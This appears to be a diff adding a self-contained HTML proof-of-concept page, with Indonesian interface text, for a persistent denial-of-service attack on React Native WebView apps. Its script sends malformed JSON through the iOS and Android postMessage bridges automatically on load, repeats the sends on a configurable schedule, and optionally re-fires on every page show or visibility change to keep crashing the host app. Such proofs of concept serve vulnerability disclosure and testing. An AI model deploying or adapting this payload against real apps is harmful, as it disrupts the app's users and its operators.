@@ -1,0 +1,100 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>ReactNativeWebView Persistent DoS PoC</title>
+<style>
+  body{font-family:system-ui,Segoe UI,Inter,Roboto,Arial,sans-serif;background:#0b0b0c;color:#eaeaea;margin:20px;line-height:1.45}
+  h1{margin:0 0 8px} .muted{color:#9aa0a6} pre{background:#111317;padding:12px;border-radius:10px;overflow:auto}
+  button{padding:10px 14px;border:1px solid #303134;background:#171717;color:#eaeaea;border-radius:10px;cursor:pointer;margin-right:8px}
+</style>
+</head>
+<body>
+<h1>ReactNativeWebView Persistent DoS PoC</h1>
+<p class="muted">PoC ini mengirim payload ke bridge <code>postMessage</code> WebView. Buka dari <b>aplikasi</b> yang memakai ReactNativeWebView (bukan browser biasa).</p>
+
+<pre id="env">Memuat…</pre>
+<div id="controls">
+  <button id="fire">Kirim Sekarang</button>
+  <button id="repeat">Kirim 5x Cepat</button>
+</div>
+<pre id="log"></pre>
+
+<script>
+(function(){
+  const qs = new URLSearchParams(location.search);
+
+  // --- Params ---
+  const defaultMsg = "{unclosed_json:"; // malformed JSON
+  const msg      = qs.get("msg")      ?? defaultMsg;
+  const times    = parseInt(qs.get("times") ?? "1", 10);
+  const interval = Math.max(0, parseInt(qs.get("interval") ?? "400", 10));
+  const platform = (qs.get("platform") || "both").toLowerCase(); // ios|android|both
+  const persist  = qs.get("persist") === "1";
+
+  const env = {
+    href: location.href,
+    userAgent: navigator.userAgent,
+    ts: new Date().toISOString(),
+    params: { msg, times, interval, platform, persist }
+  };
+  const $env = document.getElementById("env");
+  const $log = document.getElementById("log");
+  $env.textContent = JSON.stringify(env, null, 2);
+
+  function log(s){ $log.textContent += (s + "\n"); console.log(s); }
+
+  // --- Bridge helpers ---
+  function hasIOS(){ return !!(window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.ReactNativeWebView); }
+  function hasAndroid(){ return !!(window.ReactNativeWebView && typeof window.ReactNativeWebView.postMessage === "function"); }
+
+  function postOnce(payload){
+    let sent = false;
+    try{
+      if ((platform === "ios" || platform === "both") && hasIOS()){
+        window.webkit.messageHandlers.ReactNativeWebView.postMessage(payload);
+        log("➡️ iOS postMessage sent: " + payload);
+        sent = true;
+      }
+      if ((platform === "android" || platform === "both") && hasAndroid()){
+        window.ReactNativeWebView.postMessage(payload);
+        log("➡️ Android postMessage sent: " + payload);
+        sent = true;
+      }
+      if (!sent){
+        log("❌ Handler tidak tersedia untuk platform=" + platform + ". (Buka via app RN WebView)");
+      }
+    }catch(e){
+      log("💥 JS exception saat kirim: " + (e && e.message || e));
+    }
+  }
+
+  async function postMany(n, delayMs){
+    for (let i=0;i<n;i++){
+      postOnce(msg);
+      if (i < n-1 && delayMs>0){
+        await new Promise(r=>setTimeout(r, delayMs));
+      }
+    }
+  }
+
+  // --- Persist behaviour (optional) ---
+  if (persist){
+    window.addEventListener("pageshow", () => { log("📱 pageshow -> kirim"); postMany(times, interval); });
+    document.addEventListener("visibilitychange", () => {
+      if (document.visibilityState === "visible"){ log("👁️ visible -> kirim"); postMany(times, interval); }
+    });
+  }
+
+  // --- Auto-fire on load ---
+  postMany(times, interval);
+
+  // --- Manual controls for debugging ---
+  document.getElementById("fire").onclick   = () => postMany(1, 0);
+  document.getElementById("repeat").onclick = () => postMany(5, 100);
+
+})();
+</script>
+</body>
+</html>
